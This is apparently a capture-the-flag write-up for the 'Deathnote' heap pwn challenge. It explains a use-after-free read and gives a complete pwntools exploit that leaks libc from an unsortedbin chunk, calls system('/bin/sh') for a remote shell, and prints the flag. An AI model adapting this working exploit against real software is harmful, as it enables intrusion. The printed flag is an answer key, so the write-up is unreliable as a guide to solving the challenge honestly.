# Deathnote

## Description

> You stumble upon a mysterious and ancient tome, said to hold the secret to vanquishing your enemies. Legends speak of its magic powers, but cautionary tales warn of the dangers of misuse.
>
> [Attached file](./challenge)

Tags: _Pwn_ \
Difficulty: _medium_ \
Points: _325_

## Recognition phase

Running the usual recognition commands:

```
$ file deathnote
deathnote: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./glibc/ld-linux-x86-64.so.2, BuildID[sha1]=1e15d6c20dbec3b5ef262d74afd3861bd60a7cbd, for GNU/Linux 3.2.0, not stripped
```

```
$ checksec deathnote
[*] '/home/jovenoven/Downloads/ctf/cyberApocalypse2024_HTB/pwn/deathnote/deathnote'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'./glibc/'
```

```
$ ./deathnote
...
-_-_-_-_-_-_-_-_-_-_-_                                                           
|                     |                                                          
|  01. Create  entry  |                                                          
|  02. Remove  entry  |                                                          
|  03. Show    entry  |                                                          
|  42. ¿?¿?¿?¿?¿?¿?   |                                                          
|_-_-_-_-_-_-_-_-_-_-_|                                                          
                                                                                 
💀  
```

The menu strongly suggests that it's a heap challenge, as it includes familiar options such as ``create,`` ``remove,`` and ``show.`` The ``create`` option allows us to allocate a chunk in the heap of up to size 0x90. ``Remove`` simply frees a specified chunk, while ``show`` prints the contents of a chunk. This information was gathered by debugging with ``GDB``. Additionally, there's another option whose functionality is unclear from its name, ``¿?¿?¿?¿?¿?¿?``. However, when executed, the program simply crashes with a segmentation fault.

## Finding the bug

The ``show`` option exhibits a ``read-after-free`` bug, allowing us to leak addresses from malloc metadata of freed chunks.

During debugging, I observed that selecting option 42, ``¿?¿?¿?¿?¿?¿?``, triggers the program to execute the memory region pointed to by the address of the chunk labeled with ``page 0,`` passing the ``page 1`` chunk as a parameter. Although I'm uncertain about this behavior, my exploit still succeeded, assuming it to be true.

## Exploitation phase

Since there aren't any useful functions to execute within the ``ELF`` file, our objective is to somehow leak the ``libc`` address. In heap challenges, it's common to achieve this by reading metadata from an ``unsortedbin`` chunk,  and it is possible with the ``read-after-free`` bug we have at hand, we only need to create an `unsortedbin` chunk and read its data with the `show` function to leak the unsortedbin address in libc and calculate the libc base address with it. Finally, we can use the arbitrary code execution bug to call ``system(/bin/sh)`` and spawn a shell.

This summarizes the approach outlined in the following exploit script.

```Python
#!/usr/bin/python3
from pwn import *

# Set up the target binary by specifying the ELF file
elf = context.binary = ELF("deathnote")
libc = libc = ELF(elf.runpath + b"/libc.so.6")

# Defining the GDB script that will be used when running the
# binary
gs = '''
continue
'''

# Launch the binary with GDB, without GDB or REMOTE based on
# the command-line arguments
def start():
    if args.REMOTE:
        return remote("94.237.63.46", 39443)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

def malloc(size, idx, data):
    io.sendline(b"1")
    io.sendlineafter("💀 ", f"{size}".encode())
    io.sendlineafter("💀 ", f"{idx}".encode())
    io.sendlineafter("💀 ", data)
    io.recvuntil("💀 ")

def free(idx):
    io.sendline(b"2")
    io.sendlineafter("💀 ", f"{idx}".encode())
    io.recvuntil("💀 ")

def read(idx):
    io.sendline(b"3")
    io.sendlineafter("💀 ", f"{idx}".encode())
    io.recvuntil(b": ")
    data = io.recvuntil("💀 ")
    return data

def call():
    io.sendline(b"42")

io = start()

#============================================================
#                    EXPLOIT GOES HERE
#============================================================

# Allocate all necessary chunks
malloc(128, 0, b"A")
malloc(128, 1, b"A")
malloc(128, 2, b"A")
malloc(128, 3, b"A")
malloc(128, 4, b"A")
malloc(128, 5, b"A")
malloc(128, 6, b"A")
malloc(128, 7, b"A")
malloc(128, 8, b"A") # Guard against consolidation with the top chunk

# Fill the tcache bin of size 0x90 to ensure the next 0x90 chunk allocation 
# goes into the unsortedbin.
free(0) # 0x90 tcache 1
free(1) # 0x90 tcache 2
free(2) # 0x90 tcache 3
free(3) # 0x90 tcache 4
free(4) # 0x90 tcache 5
free(5) # 0x90 tcache 6
free(6) # 0x90 tcache 7
free(7) # unsortedbin

# Leak the unsortedbin address which is in libc
data = read(7)

# Calculate libc address by substracting the leaked unsortedbin address
# with its offset in libc
libc.address = u64(data[:6] + b"\x00\x00") - 0x21ace0
info("libc @ 0x%x", libc.address)

# Setting up the parameters to call system(/bin/sh)
system = hex(libc.sym.system)
malloc(128, 0, f"{system}")
malloc(128, 1, "/bin/sh\0")

# Call system(/bin/sh) with the 42 program option
call()

#============================================================

# Interact with the process
io.interactive()
```

```
$ ./xpl.py REMOTE

...

[*] Switching to interactive mode
                                                                                 
  ܀ ܀ ܀  ܀ ܀  ܀  ܀                                                               
܀  ܀   ܀ ܀   ܀  ܀  ܀                                                             
܀ Б ᾷ Ͼ Ҡ ܀  Ծ Փ Փ  ܀                                                            
܀  ܀   ܀   ܀   ܀  ܀  ܀                                                           
܀܀   ܀    ܀   ܀  ܀܀ ܀                                                            
                                                                                 
                                                                                 
[!] Executing § ƥ Ḝ Ƚ Ƚ !                                                        
$ ls
deathnote
flag.txt
glibc
$ cat flag.txt
HTB{0m43_w4_m0u_5h1nd31ru~uWu}
```

\
Flag `HTB{0m43_w4_m0u_5h1nd31ru~uWu}`
